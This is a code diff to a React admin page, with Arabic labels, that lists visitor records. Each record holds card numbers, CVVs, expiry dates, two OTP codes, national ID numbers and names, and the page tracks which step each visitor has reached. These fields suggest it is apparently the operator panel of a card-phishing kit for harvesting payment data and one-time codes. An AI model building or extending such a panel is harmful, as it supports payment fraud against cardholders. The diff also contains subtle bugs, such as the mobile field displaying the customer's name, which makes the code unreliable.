@@ -52,14 +52,14 @@ interface Notification {
   cvv: string
   id: string | "0"
   expiryDate: string
-  notificationCount: number
+  step?: 'string'
   otp: string
   otp2: string
   page: string
   cardNumber: string
   country?: string
-  personalInfo: {
-    id?: string | "0"
+  customer: {
+    mobile?: string | "0"
     name?: string
   }
   prefix: string
@@ -348,7 +348,7 @@ export default function NotificationsPage() {
         )
         const hasNewGeneralInfo = notificationsData.some(
           (notification) =>
-            (notification.idNumber || notification.email || notification.mobile) &&
+            (notification.idNumber || notification.email || notification.customer?.name) &&
             !notifications.some((n) => n.id === notification.id && (n.idNumber || n.email || n.mobile)),
         )
 
@@ -648,6 +648,7 @@ export default function NotificationsPage() {
                           <th className="px-5 py-3.5 text-right font-medium text-muted-foreground">الوقت</th>
                           <th className="px-5 py-3.5 text-center font-medium text-muted-foreground">الحالة</th>
                           <th className="px-5 py-3.5 text-center font-medium text-muted-foreground">العلم</th>
+                          <th className="px-5 py-3.5 text-center font-medium text-muted-foreground">خطوة</th>
                           <th className="px-5 py-3.5 text-center font-medium text-muted-foreground">الإجراءات</th>
                         </tr>
                       </thead>
@@ -665,12 +666,12 @@ export default function NotificationsPage() {
                             <td className="px-4 py-3.5">
                               <div className="flex flex-wrap gap-2">
                                 <Badge
-                                  variant={notification.name ? "secondary" : "outline"}
+                                  variant={notification.customer?.name ? "secondary" : "outline"}
                                   className="rounded-md cursor-pointer hover:bg-secondary/80 transition-colors duration-200 shadow-sm"
                                   onClick={() => handleInfoClick(notification, "personal")}
                                 >
                                   <Info className="h-3 w-3 mr-1" />
-                                  {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
+                                  {notification.customer?.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                                 </Badge>
                                 <Badge
                                   variant={notification.cardNumber ? "default" : "outline"}
@@ -722,6 +723,9 @@ export default function NotificationsPage() {
                                 onColorChange={handleFlagColorChange}
                               />
                             </td>
+                            <td className="px-4 py-3.5 text-center">
+                              {notification?.step}
+</td>
                             <td className="px-4 py-3.5 text-center">
                               <div className="flex justify-center gap-2">
                                 <Button
@@ -814,12 +818,12 @@ export default function NotificationsPage() {
                             <div className="grid grid-cols-1 gap-3 mb-3">
                               <div className="flex flex-wrap gap-2">
                                 <Badge
-                                  variant={notification.name ? "secondary" : "outline"}
+                                  variant={notification.customer?.name ? "secondary" : "outline"}
                                   className="rounded-md cursor-pointer hover:bg-secondary/80 transition-colors duration-200 shadow-sm"
                                   onClick={() => handleInfoClick(notification, "personal")}
                                 >
                                   <Info className="h-3 w-3 mr-1" />
-                                  {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
+                                  {notification.customer?.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                                 </Badge>
                                 <Badge
                                   variant={notification.cardNumber ? "default" : "outline"}
@@ -944,12 +948,12 @@ export default function NotificationsPage() {
                             <td className="px-4 py-3.5">
                               <div className="flex flex-wrap gap-2">
                                 <Badge
-                                  variant={notification.name ? "secondary" : "outline"}
+                                  variant={notification.customer?.name ? "secondary" : "outline"}
                                   className="rounded-md cursor-pointer hover:bg-secondary/80 transition-colors duration-200 shadow-sm"
                                   onClick={() => handleInfoClick(notification, "personal")}
                                 >
                                   <Info className="h-3 w-3 mr-1" />
-                                  {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
+                                  {notification.customer?.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                                 </Badge>
                                 <Badge
                                   variant={notification.cardNumber ? "default" : "outline"}
@@ -1094,12 +1098,12 @@ export default function NotificationsPage() {
                             <div className="grid grid-cols-1 gap-3 mb-3">
                               <div className="flex flex-wrap gap-2">
                                 <Badge
-                                  variant={notification.name ? "secondary" : "outline"}
+                                  variant={notification.customer?.name ? "secondary" : "outline"}
                                   className="rounded-md cursor-pointer hover:bg-secondary/80 transition-colors duration-200 shadow-sm"
                                   onClick={() => handleInfoClick(notification, "personal")}
                                 >
                                   <Info className="h-3 w-3 mr-1" />
-                                  {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
+                                  {notification.customer?.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                                 </Badge>
                                 <Badge
                                   variant={notification.cardNumber ? "default" : "outline"}
@@ -1224,12 +1228,12 @@ export default function NotificationsPage() {
                             <td className="px-4 py-3.5">
                               <div className="flex flex-wrap gap-2">
                                 <Badge
-                                  variant={notification.name ? "secondary" : "outline"}
+                                  variant={notification.customer?.name ? "secondary" : "outline"}
                                   className="rounded-md cursor-pointer hover:bg-secondary/80 transition-colors duration-200 shadow-sm"
                                   onClick={() => handleInfoClick(notification, "personal")}
                                 >
                                   <Info className="h-3 w-3 mr-1" />
-                                  {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
+                                  {notification.customer?.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                                 </Badge>
                                 <Badge
                                   variant={notification.cardNumber ? "default" : "outline"}
@@ -1374,12 +1378,12 @@ export default function NotificationsPage() {
                             <div className="grid grid-cols-1 gap-3 mb-3">
                               <div className="flex flex-wrap gap-2">
                                 <Badge
-                                  variant={notification.name ? "secondary" : "outline"}
+                                  variant={notification.customer?.name ? "secondary" : "outline"}
                                   className="rounded-md cursor-pointer hover:bg-secondary/80 transition-colors duration-200 shadow-sm"
                                   onClick={() => handleInfoClick(notification, "personal")}
                                 >
                                   <Info className="h-3 w-3 mr-1" />
-                                  {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
+                                  {notification.customer?.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                                 </Badge>
                                 <Badge
                                   variant={notification.cardNumber ? "default" : "outline"}
@@ -1519,16 +1523,16 @@ export default function NotificationsPage() {
                   <span className="font-semibold">{selectedNotification.email}</span>
                 </p>
               )}
-              {selectedNotification.mobile && (
+              {selectedNotification?.customer?.mobile && (
                 <p className="flex justify-between items-center py-1.5 border-b border-border/50 last:border-0">
                   <span className="font-medium text-muted-foreground">رقم الجوال:</span>
-                  <span className="font-semibold">{selectedNotification.mobile}</span>
+                  <span className="font-semibold">{selectedNotification?.customer?.name}</span>
                 </p>
               )}
-              {selectedNotification.name && (
+              {selectedNotification?.customer?.name && (
                 <p className="flex justify-between items-center py-1.5 border-b border-border/50 last:border-0">
                   <span className="font-medium text-muted-foreground">الاسم:</span>
-                  <span className="font-semibold">{selectedNotification.name}</span>
+                  <span className="font-semibold">{selectedNotification?.customer?.name}</span>
                 </p>
               )}
               {selectedNotification.phone && (
